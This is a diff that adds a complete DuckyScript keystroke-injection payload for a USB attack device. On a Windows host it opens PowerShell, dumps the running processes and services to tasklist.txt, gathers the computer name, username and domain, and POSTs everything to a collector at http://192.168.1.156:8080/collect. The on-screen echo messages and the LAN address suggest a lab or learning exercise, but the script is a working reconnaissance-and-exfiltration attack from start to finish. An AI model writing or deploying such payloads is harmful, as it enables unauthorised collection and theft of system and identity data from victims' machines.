@@ -1,0 +1,38 @@
+GUI r
+DELAY 500
+STRING pwsh
+ENTER
+DELAY 1000
+STRING echo HELLO HELLO HELLO
+ENTER
+DELAY 1000
+
+STRING tasklist /svc
+ENTER
+DELAY 1000
+
+STRING echo SAVING TASKLSIT TO TASKLIST.txt.................. 
+ENTER
+DELAY 500
+STRING tasklist /svc > tasklist.txt
+ENTER
+DELAY 1000
+
+STRING echo TASKLIST.txt SAVED.............................
+ENTER
+DELAY 1000
+
+STRING $fileContent = Get-Content -Path "tasklist.txt" -Raw
+ENTER
+DELAY 500
+STRING $form = @{ data = $fileContent; hostname = $env:COMPUTERNAME; username = $env:USERNAME; domain = $env:USERDOMAIN }
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -Uri "http://192.168.1.156:8080/collect" -Method Post -Form $form
+ENTER
+DELAY 1000
+
+STRING echo GOODBYE GOODBYE GOODBYE
+ENTER
+STRING exit
+ENTER
